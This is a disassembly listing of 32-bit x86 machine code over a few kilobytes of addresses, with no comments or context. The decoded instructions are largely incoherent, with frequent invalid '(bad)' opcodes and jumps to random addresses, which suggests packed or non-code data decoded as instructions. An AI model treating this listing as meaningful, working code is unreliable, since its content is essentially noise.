  419e1a:	inc    ecx
  419e1b:	cmc    
  419e1c:	stos   DWORD PTR es:[edi],eax
  419e1d:	push   ss
  419e1e:	adc    cl,BYTE PTR [ebp+eiz*1+0x48]
  419e22:	ja     0x419e10
  419e24:	hlt    
  419e25:	xchg   ecx,eax
  419e26:	sub    BYTE PTR [ecx+0x5c],bh
  419e29:	shl    cl,0x19
  419e2c:	adc    ebp,DWORD PTR [ebx]
  419e2e:	(bad)
  419e31:	test   al,0x36
  419e33:	into   
  419e34:	xchg   edx,eax
  419e35:	js     0x419dfe
  419e37:	pop    esi
  419e38:	add    BYTE PTR [eax-0x91a6ca6],ah
  419e3e:	sub    al,0x89
  419e40:	xchg   edx,eax
  419e41:	or     al,0x27
  419e43:	popa   
  419e44:	in     eax,dx
  419e45:	xchg   esi,eax
  419e46:	sti    
  419e47:	fchs   
  419e49:	mov    al,ch
  419e4b:	fst    DWORD PTR [esp+edx*2+0x3098a2f0]
  419e52:	jne    0x419e28
  419e54:	sbb    cl,BYTE PTR [edx+eax*4+0x4ac5023f]
  419e5b:	and    BYTE PTR [edi],0xbb
  419e5e:	dec    ecx
  419e5f:	or     BYTE PTR [edx-0x8],al
  419e62:	sub    DWORD PTR [edi+0x18],ebp
  419e65:	lock sbb bl,ch
  419e68:	add    cl,bl
  419e6a:	test   DWORD PTR [ecx],edx
  419e6c:	xchg   edi,eax
  419e6d:	inc    ebx
  419e6e:	pop    edx
  419e6f:	jno    0x419ed0
  419e71:	sbb    eax,0xa5e44b85
  419e76:	dec    eax
  419e77:	and    edi,DWORD PTR [edi+0x71e488fc]
  419e7d:	dec    edx
  419e7e:	gs ret 0x6304
  419e82:	sub    ebp,ecx
  419e84:	or     dh,BYTE PTR [edi]
  419e86:	gs sbb eax,0x5d2fdae2
  419e8c:	(bad)  
  419e8d:	sbb    eax,0xfe6d6c58
  419e92:	loope  0x419f00
  419e94:	mov    ebx,0xa8d59a18
  419e99:	enter  0xa5a4,0x15
  419e9d:	call   0xcf83626e
  419ea2:	scas   al,BYTE PTR es:[edi]
  419ea3:	jns    0x419eba
  419ea5:	jg     0x419e43
  419ea7:	hlt    
  419ea8:	jge    0x419e52
  419eaa:	adc    BYTE PTR [ebp-0x703b6808],bl
  419eb0:	loopne 0x419eb7
  419eb2:	dec    edi
  419eb3:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  419eb5:	cmp    edx,DWORD PTR [eax]
  419eb7:	sub    DWORD PTR [edi+ebx*1],ebp
  419eba:	jae    0x419f39
  419ebc:	xchg   edx,eax
  419ebd:	xchg   ebp,eax
  419ebe:	mov    esi,0x9c01
	...
  419f33:	add    BYTE PTR [edi+edx*4],bl
  419f36:	in     al,0x47
  419f38:	out    dx,eax
  419f39:	ja     0x419efa
  419f3b:	fbstp  TBYTE PTR [ebx+0x1c9e0b49]
  419f41:	xchg   edx,eax
  419f42:	cmp    DWORD PTR [ecx+0x1193a],esp
  419f48:	cmc    
  419f49:	add    BYTE PTR [eax],al
  419f4b:	add    BYTE PTR [edi],bh
  419f4d:	fisttp WORD PTR [ecx-0x2d72e0a8]
  419f53:	mov    bh,0x6d
  419f55:	fcmovnbe st,st(5)
  419f57:	test   al,0x1a
  419f59:	cld    
  419f5a:	ja     0x419efe
  419f5c:	fcmove st,st(4)
  419f5e:	shl    DWORD PTR ds:0x3d1344a0,cl
  419f64:	or     bh,dl
  419f66:	xlat   BYTE PTR ds:[ebx]
  419f67:	into   
  419f68:	mov    esp,fs
  419f6a:	adc    ebx,DWORD PTR [ebp-0x77]
  419f6d:	pop    edi
  419f6e:	lahf   
  419f6f:	icebp  
  419f70:	jecxz  0x419f14
  419f72:	xchg   edx,eax
  419f73:	lods   al,BYTE PTR ds:[esi]
  419f74:	xchg   esp,eax
  419f75:	mov    ebx,0xbf94d804
  419f7a:	mov    edx,0x9802fb9
  419f7f:	adc    eax,0x686a3f5c
  419f84:	aad    0x2
  419f86:	mov    ah,0x38
  419f88:	mov    ebx,0xbfa82bd
  419f8d:	add    cl,BYTE PTR [eax]
  419f8f:	pop    edx
  419f90:	das    
  419f91:	retf   0x39b7
  419f94:	jnp    0x419f41
  419f96:	dec    edi
  419f97:	cmp    ebp,DWORD PTR [ecx-0x2e]
  419f9a:	outs   dx,BYTE PTR ds:[esi]
  419f9b:	not    BYTE PTR [edx-0x7a67f80d]
  419fa1:	outs   dx,DWORD PTR ds:[esi]
  419fa2:	push   eax
  419fa4:	fwait
  419fa5:	xor    ch,BYTE PTR [ebx+0x40]
  419fa8:	rcr    DWORD PTR ds:[esi+0x4],cl
  419fac:	test   eax,0x1d6da896
  419fb1:	ror    DWORD PTR [ebp-0x3ff970f0],cl
  419fb7:	mov    WORD PTR [edi+0x61b71c48],ss
  419fbd:	xchg   edx,eax
  419fbe:	mov    al,0xa3
  419fc0:	inc    edi
  419fc1:	jle    0x419ff9
  419fc3:	jp     0x419f6a
  419fc5:	mov    edx,0x5b047c67
  419fca:	add    DWORD PTR [esi],ecx
  419fcc:	outs   dx,DWORD PTR ds:[esi]
  419fcd:	sbb    dl,BYTE PTR [esi-0x68]
  419fd0:	add    eax,0x17572776
  419fd5:	sbb    eax,0xf524e353
  419fda:	add    esp,DWORD PTR [ebx]
  419fdc:	jmp    0xb54e4ada
  419fe1:	aaa    
  419fe2:	inc    BYTE PTR [esi-0x63]
  419fe5:	add    eax,0x7714f38a
  419fea:	(bad)  
  419feb:	rsm    
  419fed:	inc    esp
  419fee:	ficomp DWORD PTR [edx+0x2df89b06]
  419ff4:	or     BYTE PTR [eax-0x5a],bl
  419ff7:	shr    dh,1
  419ff9:	loop   0x41a01e
  419ffb:	xor    eax,0xe7543f2c
  41a000:	jnp    0x419fa4
  41a002:	mov    BYTE PTR [eax],0xc1
  41a005:	icebp  
  41a006:	out    dx,al
  41a007:	sbb    esi,edx
  41a009:	fmul   DWORD PTR [ecx+0x3e12a7be]
  41a00f:	cmp    esp,edx
  41a011:	ret    0x11ce
  41a014:	jge    0x41a086
  41a016:	jnp    0x41a018
  41a018:	push   esp
  41a019:	push   es
  41a01a:	scas   eax,DWORD PTR es:[edi]
  41a01b:	or     BYTE PTR [ecx+0x1dbe5cef],ah
  41a021:	push   edx
  41a022:	sub    DWORD PTR [esi-0x17],ecx
  41a025:	adc    eax,0xa7d4d16f
  41a02a:	imul   DWORD PTR [eax+0x17216e75]
  41a030:	in     eax,0x66
  41a032:	jnp    0x41a074
  41a034:	xor    al,0x1f
  41a036:	mov    ds:0x5dcaf157,al
  41a03b:	jp     0x41a0ac
  41a03d:	out    dx,eax
  41a03e:	xor    BYTE PTR [ebp-0x6f],ch
	...
  41a0b1:	add    BYTE PTR [eax],al
  41a0b3:	add    BYTE PTR [edi-0x41bd617b],ch
  41a0b9:	pop    ebx
  41a0ba:	(bad)  
  41a0bb:	in     eax,dx
  41a0bc:	(bad)  ds:0xdc3b04a2
  41a0c2:	or     eax,0x11a2f31
  41a0c7:	add    ch,dh
  41a0c9:	add    BYTE PTR [eax],al
  41a0cb:	add    BYTE PTR [edx+eiz*8-0x39fce9a2],cl
  41a0d2:	int3   
  41a0d3:	xchg   ebx,eax
  41a0d4:	mov    cl,0x39
  41a0d6:	push   edi
  41a0d7:	sbb    al,0xcc
  41a0d9:	sub    eax,0x231636b5
  41a0de:	(bad)  [ebp+0x4b]
  41a0e1:	jp     0x41a103
  41a0e3:	ret    
  41a0e4:	(bad)  
  41a0e5:	in     al,0x36
  41a0e7:	rcr    DWORD PTR [ecx],0x80
  41a0ea:	(bad)  
  41a0eb:	and    DWORD PTR [esi],edx
  41a0ed:	repnz inc eax
  41a0ef:	xchg   esi,eax
  41a0f0:	mov    cl,0xef
  41a0f2:	xor    esi,DWORD PTR [ebx-0x28d4a7a1]
  41a0f8:	retf   0xb2b7
  41a0fb:	lods   eax,DWORD PTR fs:[esi]
  41a0fd:	push   0x80800ea6
  41a102:	out    0x59,eax
  41a104:	mov    ecx,0xb09c69e1
  41a109:	xchg   ah,cl
  41a10b:	lods   eax,DWORD PTR ds:[esi]
  41a10c:	lds    edi,FWORD PTR [edi+0x55aa1018]
  41a112:	adc    eax,0x3fb0812b
  41a117:	jle    0x41a195
  41a119:	mov    ds:0x3d1dc5e7,al
  41a11e:	push   edi
  41a11f:	or     esp,0x862aa2ad
  41a125:	ins    BYTE PTR es:[edi],dx
  41a126:	out    dx,eax
  41a127:	jg     0x41a14d
  41a129:	and    BYTE PTR [ecx],bh
  41a12b:	std    
  41a12c:	add    eax,0x71516251
  41a131:	jle    0x41a14e
  41a133:	sbb    edx,edi
  41a135:	fs cdq 
  41a137:	add    edx,DWORD PTR [edi-0x15]
  41a13a:	fs fs dec ecx
  41a13d:	inc    ebx
  41a13e:	aas    
  41a13f:	mov    eax,ebp
  41a141:	sub    eax,0xe4d9ddd
  41a146:	shl    DWORD PTR [edi+ecx*1],1
  41a149:	xchg   esp,eax
  41a14a:	jo     0x41a104
  41a14c:	pop    edx
  41a14d:	push   edx
  41a14e:	and    al,0x38
  41a150:	sti    
  41a151:	push   0x1
  41a153:	and    ebx,DWORD PTR [ebx]
  41a155:	icebp  
  41a156:	jecxz  0x41a155
  41a158:	in     al,dx
  41a159:	push   cs
  41a15a:	xor    eax,0x9b078e53
  41a15f:	cmp    DWORD PTR [ebx],eax
  41a161:	imul   edx,DWORD PTR [ecx],0xdbb3ad46
  41a167:	loopne 0x41a0f7
  41a169:	sbb    edi,DWORD PTR [esi-0x10]
  41a16c:	daa    
  41a16d:	call   0xf7f:0x80073820
  41a174:	loop   0x41a1af
  41a176:	in     al,dx
  41a177:	fcomp  DWORD PTR [eax+edi*2-0x14]
  41a17b:	ror    BYTE PTR [edi],cl
  41a17d:	xchg   ecx,eax
  41a17e:	test   dh,bl
  41a180:	pop    ds
  41a181:	push   0xcbbda9ab
  41a186:	(bad)  
  41a187:	repz mov eax,ds:0x1f3fe2c3
  41a18d:	mov    edx,0x30e1c556
  41a192:	into   
  41a193:	push   edi
  41a194:	loop   0x41a201
  41a196:	leave  
  41a197:	jmp    0x36ce:0xf3e0fbee
  41a19e:	stc    
  41a19f:	fild   WORD PTR [edx+0x19]
  41a1a2:	stc    
  41a1a3:	sar    DWORD PTR [eax+ebx*2+0x17],cl
  41a1a7:	mov    dh,0x33
  41a1a9:	repnz sbb eax,0x17a74adb
  41a1af:	and    eax,0x763b0415
  41a1b4:	push   0xc4a2f657
  41a1b9:	push   ebx
  41a1ba:	scas   al,BYTE PTR es:[edi]
  41a1bb:	arpl   WORD PTR [ebx+eiz*1],ax
  41a1be:	and    BYTE PTR ds:0xfa,cl
	...
  41a234:	mov    al,ds:0xff33bae7
  41a239:	jg     0x41a1e4
  41a23b:	imul   DWORD PTR [esi+eiz*4]
  41a23e:	push   edi
  41a23f:	not    BYTE PTR [ecx-0x2]
  41a242:	test   DWORD PTR [edx+0x11b24],ebx
  41a248:	cmc    
  41a249:	add    BYTE PTR [eax],al
  41a24b:	add    BYTE PTR [edx],ch
  41a24d:	inc    edx
  41a24e:	push   esp
  41a24f:	inc    esi
  41a250:	jl     0x41a28c
  41a252:	call   0xfef287e2
  41a257:	add    esi,DWORD PTR [edx+0x540cf112]
  41a25d:	push   ss
  41a25e:	inc    edx
  41a25f:	(bad)  
  41a260:	jne    0x41a283
  41a262:	push   ecx
  41a263:	dec    ebx
  41a264:	idiv   ebp
  41a266:	cli    
  41a267:	nop
  41a268:	inc    edx
  41a269:	(bad)  
  41a26b:	jno    0x41a2a9
  41a26d:	cli    
  41a26e:	xor    DWORD PTR [bp-0x7b],edx
  41a272:	mov    ecx,0xb55458d3
  41a277:	pop    ecx
  41a278:	adc    BYTE PTR [eax],bl
  41a27a:	mov    esi,0xd2e93239
  41a27f:	repnz inc BYTE PTR [ebp+0x7e381e09]
  41a286:	mov    dh,0xc1
  41a288:	dec    ebp
  41a289:	popf   
  41a28a:	push   ebp
  41a28b:	out    0x77,al
  41a28d:	sub    BYTE PTR ds:0xb8816446,0x53
  41a294:	je     0x41a233
  41a296:	outs   dx,BYTE PTR ds:[esi]
  41a297:	mov    ds:0xa73ca4b3,eax
  41a29c:	call   edx
  41a29e:	inc    ecx
  41a29f:	push   ds
  41a2a0:	sub    BYTE PTR [edx+0x12],ah
  41a2a3:	outs   dx,BYTE PTR ds:[esi]
  41a2a4:	mov    ah,0xb6
  41a2a6:	cs and eax,0x4548f7ac
  41a2ac:	sub    DWORD PTR ds:0x7ba75731,edx
  41a2b2:	das    
  41a2b3:	in     eax,dx
  41a2b4:	mov    ds:0x192edf0e,al
  41a2b9:	pop    eax
  41a2ba:	mov    al,ds:0xa57977cb
  41a2bf:	jp     0x41a305
  41a2c1:	mov    bh,0x1d
  41a2c3:	jl     0x41a28f
  41a2c5:	or     esi,ebp
  41a2c7:	stos   BYTE PTR es:[edi],al
  41a2c8:	jle    0x41a312
  41a2ca:	dec    edx
  41a2cb:	jmp    0x6077:0x85a36142
  41a2d2:	push   0x753d33e0
  41a2d7:	sub    BYTE PTR [edx-0x2a2fa107],0x93
  41a2de:	fsub   st,st(3)
  41a2e0:	cld    
  41a2e1:	loop   0x41a2fe
  41a2e3:	jns    0x41a338
  41a2e5:	stc    
  41a2e6:	or     al,0xbe
  41a2e8:	imul   esi,DWORD PTR [eiz*4+0xfe64a37],0xffffffa4
  41a2f0:	dec    edx
  41a2f1:	ret    
  41a2f2:	pop    edx
  41a2f3:	and    BYTE PTR [ecx+0x27],dl
  41a2f6:	dec    ebp
  41a2f7:	int    0x4b
  41a2f9:	mov    ebp,0xa93a87e0
  41a2fe:	push   ebx
  41a2ff:	sub    ch,BYTE PTR ds:0x9663c5bf
  41a305:	and    DWORD PTR [ebx+0x3b2d59be],0x61
  41a30c:	gs stos BYTE PTR es:[edi],al
  41a30e:	rcl    DWORD PTR [esi+0x77779e0f],cl
  41a314:	or     BYTE PTR [esi+0x6522e0d1],al
  41a31a:	cmp    DWORD PTR [ecx+0x18],ecx
  41a31d:	cli    
  41a31e:	jge    0x41a2dd
  41a320:	inc    esi
  41a321:	das    
  41a322:	mov    eax,0xd2395c14
  41a327:	es stc 
  41a329:	inc    ebx
  41a32a:	out    0xda,al
  41a32c:	add    edx,DWORD PTR [ebp+0x2918faf6]
  41a332:	nop
  41a333:	enter  0xf21b,0x87
  41a337:	out    dx,al
  41a338:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a339:	stos   BYTE PTR es:[edi],al
  41a33a:	jnp    0x41a36f
  41a33c:	cdq    
  41a33d:	pop    edx
  41a33e:	xchg   edi,eax
  41a33f:	or     ebp,DWORD PTR [eax+eax*1+0x0]
	...
  41a3b3:	add    BYTE PTR ds:0xed3a6998,bh
  41a3b9:	sti    
  41a3ba:	jg     0x41a35b
  41a3bc:	and    DWORD PTR [esi+edx*4+0x6a],ebp
  41a3c0:	lea    eax,[esi+0x22]
  41a3c3:	outs   dx,DWORD PTR ds:[esi]
  41a3c4:	sbb    DWORD PTR [ecx+eax*1],ebx
  41a3c7:	add    ch,dh
  41a3c9:	add    BYTE PTR [eax],al
  41a3cb:	add    BYTE PTR [ecx+ecx*4+0x21a66285],ch
  41a3d2:	or     DWORD PTR [esi+0x2ed6aa24],ebx
  41a3d8:	imul   ecx,DWORD PTR [ecx+0x4c],0x8a4c7716
  41a3df:	je     0x41a378
  41a3e1:	stc    
  41a3e2:	mov    ah,0x82
  41a3e4:	popf   
  41a3e5:	fs sti 
  41a3e7:	pop    eax
  41a3e8:	(bad)  
  41a3e9:	cdq    
  41a3ea:	pop    es
  41a3eb:	sbb    esp,eax
  41a3ed:	lds    eax,FWORD PTR [esi+0x2561e978]
  41a3f3:	or     esi,edx
  41a3f5:	adc    DWORD PTR [ebx],edx
  41a3f7:	enter  0x9d9c,0x16
  41a3fb:	fsub   QWORD PTR [esi-0x12]
  41a3fe:	scas   al,BYTE PTR es:[edi]
  41a3ff:	add    eax,0x4c7018f9
  41a404:	mov    al,0x55
  41a406:	push   esi
  41a407:	pop    esi
  41a408:	jmp    0x41a47e
  41a40a:	popa   
  41a40b:	(bad)  
  41a40d:	inc    edx
  41a40e:	jl     0x41a423
  41a410:	add    al,0x71
  41a412:	jmp    FWORD PTR [eax-0x73fcf]
  41a418:	out    dx,eax
  41a419:	(bad)  
  41a41a:	leave  
  41a41b:	and    dh,BYTE PTR [ebx+0xd]
  41a41e:	xchg   esp,eax
  41a41f:	jno    0x41a46b
  41a421:	push   ebp
  41a422:	int    0x53
  41a424:	pop    ecx
  41a425:	pop    ss
  41a426:	retf   0x4c71
  41a429:	sbb    al,0x44
  41a42b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a42c:	pop    es
  41a42d:	cmp    bh,BYTE PTR [edi-0x6ce5e6a6]
  41a433:	aad    0xd
  41a435:	mov    ax,0xc2f3
  41a439:	fsubr  QWORD PTR [eax-0x11]
  41a43c:	(bad)  
  41a43e:	jmp    0x41a3fb
  41a440:	(bad)  
  41a441:	aam    0xe8
  41a443:	mov    eax,ds:0xa7f71dd
  41a448:	mov    al,ds:0xae582b4b
  41a44d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a44e:	cmp    dh,BYTE PTR [esi]
  41a450:	int3   
  41a451:	pusha  
  41a452:	dec    BYTE PTR [eax+0x6c]
  41a455:	cmp    BYTE PTR [ebp-0x1d],dl
  41a458:	sbb    BYTE PTR [esi],ah
  41a45a:	cmp    al,0x2f
  41a45c:	cs loope 0x41a4cb
  41a45f:	adc    DWORD PTR [eax+edi*2+0x9],ebp
  41a463:	test   BYTE PTR [ecx+0x78],bl
  41a466:	(bad)
  41a469:	jnp    0x41a4df
  41a46b:	pop    esi
  41a46c:	mov    cl,0x52
  41a46e:	cmp    DWORD PTR [ebp+0x43],esp
  41a471:	adc    edx,DWORD PTR ds:0xc851de32
  41a477:	mov    ds,WORD PTR [edi+0x65]
  41a47a:	(bad)  
  41a47c:	pop    ecx
  41a47d:	sbb    DWORD PTR [esi-0x7bf79147],eax
  41a483:	and    ah,BYTE PTR [edi-0x17]
  41a486:	ja     0x41a44a
  41a488:	mov    ah,0x7e
  41a48a:	jmp    0x4732:0x1bb21d50
  41a491:	add    al,0xfc
  41a493:	mov    WORD PTR [edi],cs
  41a495:	out    dx,al
  41a496:	dec    edx
  41a497:	jbe    0x41a4c8
  41a499:	je     0x41a42e
  41a49b:	cmp    DWORD PTR [ebx+0x3],edx
  41a49e:	enter  0xa868,0x64
  41a4a2:	sub    al,0x0
  41a4a4:	dec    ebp
  41a4a5:	jns    0x41a4b2
  41a4a7:	mov    ds:0xbb84de8a,eax
  41a4ac:	push   0x623efd
  41a4b1:	xchg   ebx,edx
  41a4b3:	cwde   
  41a4b4:	lahf   
  41a4b5:	sbb    DWORD PTR [edi+0x38da5dda],0xcbc3e00f
  41a4bf:	mov    ebx,0x7
	...
  41a534:	scas   eax,DWORD PTR es:[edi]
  41a535:	aam    0x8d
  41a537:	(bad)  
  41a538:	(bad)  
  41a539:	jnp    0x41a52a
  41a53b:	fld    QWORD PTR [eax+0x41e9e0aa]
  41a541:	fcomp  st(1)
  41a543:	ror    DWORD PTR [esi],cl
  41a545:	sbb    eax,0xf50001
  41a54a:	add    BYTE PTR [eax],al
  41a54c:	xor    eax,0xcc00a290
  41a551:	xor    BYTE PTR [eax-0x799353b6],al
  41a557:	jno    0x41a4f9
  41a559:	jae    0x41a560
  41a55b:	jmp    0x818d:0xfde6e975
  41a562:	pop    ss
  41a563:	sub    ecx,DWORD PTR [ebp+eax*1-0x1c]
  41a567:	mov    edx,0xd92cbf00
  41a56c:	ret    
  41a56d:	push   ds
  41a56e:	or     ecx,DWORD PTR [eax-0x7]
  41a571:	pop    edx
  41a572:	(bad)  
  41a574:	mov    bl,0xe9
  41a576:	out    0x2e,al
  41a578:	les    esp,FWORD PTR [eax+ebp*1+0x17ea04d0]
  41a57f:	daa    
  41a580:	out    dx,al
  41a581:	and    BYTE PTR [ebx],al
  41a583:	jp     0x41a522
  41a585:	fstp   DWORD PTR [ecx-0x11]
  41a588:	mov    eax,0x4e54e8b9
  41a58d:	jo     0x41a5ef
  41a58f:	inc    ebx
  41a590:	xor    al,BYTE PTR [ebx-0x66301ac9]
  41a596:	aaa    
  41a597:	ins    DWORD PTR es:[edi],dx
  41a598:	mov    esp,0x50d9b69
  41a59d:	mov    ds:0x933cf91e,al
  41a5a2:	or     ah,BYTE PTR [ebx-0x2d]
  41a5a5:	cld    
  41a5a6:	scas   al,BYTE PTR es:[edi]
  41a5a7:	aad    0x9f
  41a5a9:	xor    edi,0xffffffa6
  41a5ac:	ret    0xb71f
  41a5af:	mov    dl,0x42
  41a5b1:	ins    BYTE PTR es:[edi],dx
  41a5b2:	daa    
  41a5b3:	jl     0x41a5db
  41a5b5:	cmp    eax,0x978ff4f4
  41a5ba:	adc    BYTE PTR [edx-0x47],dl
  41a5bd:	aad    0x38
  41a5bf:	ret    
  41a5c0:	popf   
  41a5c1:	mov    ebp,0xae88a3d0
  41a5c6:	push   ebx
  41a5c7:	add    BYTE PTR [ecx-0x23],bl
  41a5ca:	push   cs
  41a5cb:	add    DWORD PTR [ecx-0x27764221],eax
  41a5d1:	or     ch,al
  41a5d3:	sbb    eax,0x43fa71ad
  41a5d8:	mov    edi,edx
  41a5da:	je     0x41a5a1
  41a5dc:	lods   eax,DWORD PTR ds:[esi]
  41a5dd:	loop   0x41a632
  41a5df:	mov    ds:0x202938b9,al
  41a5e4:	mov    ch,0x11
  41a5e6:	lods   eax,DWORD PTR ds:[esi]
  41a5e7:	shl    DWORD PTR [ebx+esi*8+0x73ea5b32],1
  41a5ee:	mov    bl,0x24
  41a5f0:	lds    ebx,FWORD PTR [edi-0x32479517]
  41a5f6:	loopne 0x41a5cb
  41a5f8:	ss add eax,0x1626b47e
  41a5fe:	(bad)  
  41a5ff:	ins    BYTE PTR es:[edi],dx
  41a600:	cld    
  41a601:	mov    ebx,0x176aa0bc
  41a606:	call   0xe4abfd17
  41a60b:	jns    0x41a65a
  41a60d:	lea    ecx,[esi]
  41a60f:	mov    edi,0xaba7b2c5
  41a614:	loopne 0x41a657
  41a616:	and    BYTE PTR [eax],dh
  41a618:	xchg   ebp,eax
  41a619:	sub    esi,ebx
  41a61b:	fwait
  41a61c:	(bad)  
  41a61d:	mov    bl,0xdf
  41a61f:	pop    ebx
  41a620:	daa    
  41a621:	or     bl,BYTE PTR [eax-0x2406fcb6]
  41a627:	sub    al,0xd1
  41a629:	icebp  
  41a62a:	test   BYTE PTR [eax+0x50],0xf2
  41a62e:	dec    ebx
  41a62f:	scas   eax,DWORD PTR es:[edi]
  41a630:	xor    esp,ebx
  41a632:	add    eax,0x76162d8
  41a637:	xor    ah,BYTE PTR [edi]
  41a639:	mov    edi,0x1078e386
  41a63e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a63f:	xchg   BYTE PTR [ebx+0x0],ch
	...
  41a6b2:	add    BYTE PTR [eax],al
  41a6b4:	mov    bl,0x3f
  41a6b6:	jno    0x41a71d
  41a6b8:	std    
  41a6b9:	outs   dx,DWORD PTR ds:[esi]
  41a6ba:	mov    bh,0xff
  41a6bc:	xchg   ecx,eax
  41a6bd:	pop    edx
  41a6be:	cdq    
  41a6bf:	mov    dl,0x51
  41a6c1:	int3   
  41a6c2:	cmp    esi,esi
  41a6c4:	add    ebx,DWORD PTR [esi]
  41a6c6:	add    DWORD PTR [eax],eax
  41a6c8:	cmc    
  41a6c9:	add    BYTE PTR [eax],al
  41a6cb:	add    BYTE PTR [eax+0x5e],bh
  41a6ce:	push   es
  41a6cf:	cwde   
  41a6d0:	(bad)  
  41a6d1:	repnz lds esi,FWORD PTR [ecx-0x40]
  41a6d5:	add    BYTE PTR [ecx+0x34],dh
  41a6d8:	fwait
  41a6d9:	cmp    eax,0xdd5f3fea
  41a6de:	xchg   ecx,eax
  41a6df:	pop    ebp
  41a6e0:	adc    BYTE PTR [esi],bh
  41a6e2:	je     0x41a6e8
  41a6e4:	ja     0x41a6b8
  41a6e6:	adc    bl,bh
  41a6e8:	enter  0x6e0d,0x3f
  41a6ec:	push   es
  41a6ed:	lea    edx,[eax]
  41a6ef:	out    dx,eax
  41a6f0:	xlat   BYTE PTR ds:[ebx]
  41a6f1:	mov    edx,0xdbd75123
  41a6f6:	je     0x41a6cb
  41a6f8:	push   cs
  41a6f9:	pop    es
  41a6fa:	mov    ds:0x34e4adbb,eax
  41a6ff:	jmp    0x57e0600c
  41a704:	add    BYTE PTR [edi],bl
  41a706:	pop    ecx
  41a707:	in     al,0xb7
  41a709:	mov    ebx,0xf0d1def1
  41a70e:	neg    ebp
  41a710:	out    0x49,al
  41a712:	gs retf 0xe538
  41a716:	sub    ah,BYTE PTR [esi]
  41a718:	int3   
  41a719:	cmp    al,0x18
  41a71b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a71c:	jle    0x41a70a
  41a71e:	sub    al,0xb6
  41a720:	adc    ebp,DWORD PTR [edx+0x3769bcf2]
  41a726:	mov    al,ds:0x58484eb6
  41a72b:	adc    eax,0xaac84e0
  41a730:	in     al,dx
  41a731:	call   0xbbb162d1
  41a736:	in     al,0x8a
  41a738:	or     edx,esi
  41a73a:	inc    ecx
  41a73b:	pop    esp
  41a73c:	push   ebx
  41a73d:	ja     0x41a73e
  41a73f:	sub    ebx,edx
  41a741:	sbb    edx,ebp
  41a743:	imul   DWORD PTR [ebp+esi*8+0x1fff34b]
  41a74a:	inc    ebp
  41a74b:	dec    DWORD PTR ss:[ebx-0x79ae83a1]
  41a752:	inc    DWORD PTR [ecx-0x2b]
  41a755:	sbb    eax,0x1fc4110f
  41a75a:	fwait
  41a75b:	mov    ch,0xe
  41a75d:	adc    BYTE PTR [ecx-0x444fd9b1],bl
  41a763:	(bad)  [edi+eiz*4]
  41a766:	std    
  41a767:	pop    edi
  41a768:	shr    DWORD PTR [ecx-0x3209f703],0x75
  41a76f:	cmp    cl,BYTE PTR [ebp+0x3447084a]
  41a775:	sbb    DWORD PTR [edi-0x1b35eb14],0x436a656e
  41a77f:	jmp    0x978fe8a0
  41a784:	adc    al,0x3e
  41a786:	outs   dx,BYTE PTR ds:[esi]
  41a787:	xor    BYTE PTR [eax-0x4a],0xaa
  41a78b:	je     0x41a750
  41a78d:	nop    edi
  41a790:	sub    eax,0xcec6c688
  41a795:	mov    ch,BYTE PTR [ecx]
  41a797:	mov    dh,0xa6
  41a799:	bound  esi,QWORD PTR [ebx-0x6c6069e3]
  41a79f:	shr    BYTE PTR [ecx-0xc],cl
  41a7a2:	pop    ds
  41a7a3:	sub    DWORD PTR [ecx],edi
  41a7a5:	inc    ecx
  41a7a6:	xor    BYTE PTR [eax],0x58
  41a7a9:	sbb    BYTE PTR [ebp-0x33f8dd70],0x7c
  41a7b0:	aaa    
  41a7b1:	mov    bh,0x61
  41a7b3:	dec    ebx
  41a7b4:	outs   dx,DWORD PTR ds:[esi]
  41a7b5:	dec    esp
  41a7b6:	daa    
  41a7b7:	fs aam 0x8c
  41a7ba:	sbb    ah,BYTE PTR [ebx+0x4fe7ce6]
  41a7c0:	lahf   
	...
  41a831:	add    BYTE PTR [eax],al
  41a833:	add    BYTE PTR [edx-0x201eb8e7],al
  41a839:	jmp    DWORD PTR [esi-0xf626c85]
  41a83f:	loop   0x41a7d7
  41a841:	test   eax,0x1ef82974
  41a846:	add    DWORD PTR [eax],eax
  41a848:	cmc    
  41a849:	add    BYTE PTR [eax],al
  41a84b:	add    BYTE PTR ds:0xee5ccefc,ah
  41a851:	rol    DWORD PTR [edx],cl
  41a853:	and    DWORD PTR [eax],edi
  41a855:	(bad)  
  41a857:	pop    ds
  41a858:	sbb    bl,al
  41a85a:	mov    ebx,0xf5a9a53a
  41a85f:	ret    0x865
  41a862:	popa   
  41a863:	inc    edx
  41a864:	add    dl,BYTE PTR [ecx]
  41a866:	and    DWORD PTR [esi+0x40a9de33],edx
  41a86c:	jp     0x41a85b
  41a86e:	cmp    edx,DWORD PTR [ebx+0x51]
  41a871:	mov    edi,0x136b7013
  41a876:	jbe    0x41a893
  41a878:	mov    al,ds:0x203e6033
  41a87d:	leave  
  41a87e:	push   edi
  41a87f:	ja     0x41a81a
  41a881:	or     edx,DWORD PTR [ebp-0x55]
  41a884:	fist   DWORD PTR ds:0x55059878
  41a88a:	inc    ebx
  41a88b:	fisttp QWORD PTR [ebx+0x20]
  41a88e:	in     eax,dx
  41a88f:	jnp    0x4043c66b
  41a895:	xor    ecx,edx
  41a897:	sbb    al,0xb6
  41a899:	inc    ecx
  41a89a:	out    0xb2,eax
  41a89c:	ja     0x41a91a
  41a89e:	mov    edi,0xb6256f7d
  41a8a3:	pop    ecx
  41a8a4:	pusha  
  41a8a5:	jbe    0x41a8fb
  41a8a7:	lods   eax,DWORD PTR ds:[esi]
  41a8a8:	nop
  41a8a9:	adc    bl,BYTE PTR ds:0x612fb714
  41a8af:	push   0x3454c809
  41a8b4:	dec    eax
  41a8b5:	xor    eax,DWORD PTR [ebp-0x5c]
  41a8b8:	outs   dx,BYTE PTR ds:[esi]
  41a8b9:	das    
  41a8ba:	mov    esi,0x87ed958f
  41a8bf:	fadd   DWORD PTR [ebx+edx*8+0x4dc28464]
  41a8c6:	adc    DWORD PTR [edi-0x77],ebx
  41a8c9:	mov    ebx,0x45756453
  41a8ce:	neg    BYTE PTR [edx+0x6c]
  41a8d1:	cdq    
  41a8d2:	push   ebp
  41a8d3:	push   esp
  41a8d4:	pop    ecx
  41a8d5:	aas    
  41a8d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8d7:	or     DWORD PTR ds:0x41bc20b0,esi
  41a8dd:	pop    esp
